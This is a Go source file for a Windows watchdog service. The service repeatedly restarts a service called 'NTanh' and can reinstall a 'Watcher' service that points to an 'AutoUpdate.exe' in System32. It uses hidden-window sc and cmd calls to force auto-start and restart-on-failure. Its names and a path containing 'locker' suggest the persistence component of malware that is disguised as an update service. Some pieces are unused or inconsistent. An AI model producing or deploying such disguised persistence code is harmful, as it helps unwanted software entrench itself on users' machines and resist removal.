package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"

	"github.com/kardianos/service"
	"golang.org/x/sys/windows"
)

var updateService = `C:\programdata\locker\updateService`
var ServiceName = "Watcher"
var ServiceUpdate = "NTanh"
var dst = `C:\Windows\System32\AutoUpdate.exe`
var startAuto = `sc config NTanh start= auto`

func main() {
	// Khởi tạo khung Service
	var s service.Service
	var err error
	for {
		if s, err = GetService(ServiceUpdate); err != nil {
			time.Sleep(time.Second)
			continue
		}
		break
	}
	// Bắt đầu vòng đời chính của Windows Service
	s.Run()
}

func Cmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,       // Ẩn cửa sổ
		CreationFlags: 0x08000000, // Không tạo cửa sổ mới
	}
	cmd.Run()
}

func checkSignApp() windows.Handle {
	name := windows.StringToUTF16Ptr("Global\\watcherDog")
	mutex, err := windows.CreateMutex(nil, false, name)
	if err != nil {
		os.Exit(0)
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		os.Exit(0)
	}
	return mutex
}

func GetService(name string) (service.Service, error) {
	cfg := &service.Config{
		Name: name,
	}
	// BẮT BUỘC truyền &program{} thay vì nil
	return service.New(&program{}, cfg)
}

func (p *program) Stop(s service.Service) error {
	return nil
}

type program struct{}

func (p *program) Start(s service.Service) error {

	go p.run() // rất quan trọng
	return nil
}

func (p *program) run() {
	M := checkSignApp
	_ = M
	errCount := 0
	for {
		s, err := GetService(ServiceUpdate)
		if err != nil {
			if errCount >= 3 {
				errCount = 0
				if _, err := os.Stat(dst); !os.IsNotExist(err) {
					if s, err = InstallService(ServiceUpdate); err == nil {
						Cmd("sc", "failure", ServiceName, "reset=", "86400", "actions=", "restart/1000")
						Cmd("cmd", "/c", startAuto)
						s.Start()
					}
				}
			}
			time.Sleep(time.Second)
			errCount++
			continue
		}
		errCount = 0
		for {
			status, err := s.Status()
			if err != nil {
				break
			}
			if status != service.StatusRunning {
				Cmd("cmd", "/c", startAuto)
				time.Sleep(200 * time.Millisecond)
				if _, err := os.Stat(updateService); os.IsNotExist(err) {
					Cmd("cmd", "/c", startAuto)
					s.Start()
					time.Sleep(time.Second * 3)
				}
			}
			time.Sleep(time.Millisecond * 500)
		}
	}
}

func InstallService(exe string) (service.Service, error) {
	cfg := &service.Config{
		Name:        ServiceName,
		DisplayName: fmt.Sprintf("%s Service", ServiceName),
		Description: fmt.Sprintf("%s Service", ServiceName),
		Executable:  `C:\Windows\System32\AutoUpdate.exe`,
	}
	s, err := service.New(&program{}, cfg)
	if err != nil {
		return nil, err
	}
	return s, s.Install()
}
